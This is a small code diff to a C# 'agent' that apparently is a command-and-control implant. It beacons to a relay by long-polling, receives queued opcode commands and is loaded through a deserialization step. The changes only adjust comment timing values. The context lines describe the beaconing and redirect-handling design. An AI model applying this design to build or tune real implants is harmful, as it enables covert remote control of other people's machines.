@@ -15,7 +15,7 @@ namespace CSharpAgent
     //     since the last POST, empty when none;
     //   • every successful answer is 200 whose body is the same frame stream of the
     //     queued [opcode][payload] commands (batched up to 32 frames / 4 MiB) — an
-    //     empty body means nothing is queued, re-POST immediately (the relay's 20–30 s
+    //     empty body means nothing is queued, re-POST immediately (the relay's 25–35 s
     //     long-poll hold is the only sleep);
     //   • any non-200 answer or transport failure is FATAL — Run() returns and the
     //     deserialization below us unwinds. No retry loop: presence is re-established by
@@ -95,7 +95,7 @@ namespace CSharpAgent
                 post++;
 #if DEBUG
                 // [6] only on the FIRST POST — healthy idle iterations stay silent (a line
-                // per 20-30 s long-poll would grow the file forever).
+                // per 25-35 s long-poll would grow the file forever).
                 if (post == 1)
                     Diag.Show("[6] POST #1", "sending " + BuildFrames(pending).Length +
                         " bytes — the owed first beacon rides this one");
@@ -313,7 +313,7 @@ namespace CSharpAgent
             // redirects by default — a 302 to a live URL reads as a clean 200 and the
             // fatal never fires (observed live: the agent beaconed on through it).
             request.AllowAutoRedirect = false;
-            // The relay holds each request 20–30 s server-side; keep generous headroom over
+            // The relay holds each request 25–35 s server-side; keep generous headroom over
             // that window (the JScript agent's receive timeout is 45 s for the same reason).
             request.Timeout = 60000;
             request.ReadWriteTimeout = 60000;
